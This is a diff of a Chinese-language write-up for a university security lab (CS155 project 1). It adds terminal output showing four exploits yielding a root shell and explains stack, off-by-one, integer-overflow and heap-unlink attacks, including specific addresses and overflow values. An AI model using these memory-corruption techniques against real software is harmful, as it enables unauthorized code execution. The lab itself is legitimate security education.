@@ -35,6 +35,12 @@ int main(int argc, char *argv[])
 }
 ```
 最基本的buffer overflow，直接更改return的地址，指向buf前面的NOP，然后进入执行shellcode
+
+```console
+user@vm-cs155:~/cs155/proj1/sploits$ ./sploit1
+#
+```
+
 ```c
 int main(void)
 {
@@ -104,6 +110,11 @@ int main(int argc, char *argv[])
 因为x86用的是little endian，所以溢出的两个byte就是`%ebp`的最后的两个byte，比如原来系统中`%ebp`为`0xbffffd90`，因为`sploitstring[200]=0`，所以`%ebp`就变为`0xbffffd00`，因为buf里面有201个byte，但是32位机器要连续两个word，所以溢出了两个byte
 
 buf从`0xbffffcc8`开始，`%ebp=0xbffffd90`，buf溢出后修改`%ebp`的最后两个byte使得`%ebp`变成`%ebp=0xbffffd00`也就是在buf中间的`new_ebp`，当函数返回时，`%esp`会从`new_ebp`中load，为了方便显示，`0xbffffd00`中存了`0xffffffff`，然后`%esp`拿栈顶来load给`%eip`也就数`new_ebp`后面的`new_eip`，这也是shellcode的起始地址
+
+```console
+user@vm-cs155:~/cs155/proj1/sploits$ ./sploit2
+#
+```
 
 **target1和target2的区别**
 
@@ -215,6 +226,11 @@ int main(int argc, char *argv[])
 关键的是要满足以下几个条件，有符号的count要小于1000，无符号的要满足`(20 * count) mod (2^32) = k`略大于20000，但是又不能太大，否则会seg fault
 
 所以是`20 * count = k + 2^32 * r`，`count = k/20 + 2^32*r/20`，因为k需要略大于20000才能overflow并且需要是20的整数倍，所以取`k=20020`，又因为count需要overflow int，所以`1001+2^32*r/20 > 2^32 - 1`，因此取`r=10`，所以`count=1001+2^31=2147484649`，所以`(20 * 2147484649) mod 2^32 = 20020`，插入shellcode然后修改return地址即可
+
+```console
+user@vm-cs155:~/cs155/proj1/sploits$ ./sploit3
+#
+```
 
 
 ```c
@@ -332,6 +348,12 @@ q.prev.next = q.next
 *(int *)(sploitstring + 512 - 4) = 0xbffffa70; // q.next = eip
 ```
 当free q指针时，要做`q.next.prev=q.prev`，具体来说就是因为之前已经设置了`q.next=eip`，这里`q.next.prev=(chunk*)eip->prev=*eip`，所以一旦free了q指针，就改变了eip里头的东西，程序就返回到了shellcode。还要注意的是，要把q的free bit置位，然后通过jmp指令跳过eip指向的地址内容发生错乱也就是这里的`\x90`
+
+```console
+user@vm-cs155:~/cs155/proj1/sploits$ ./sploit4
+#
+```
+
 ```c
 int main(void)
 {
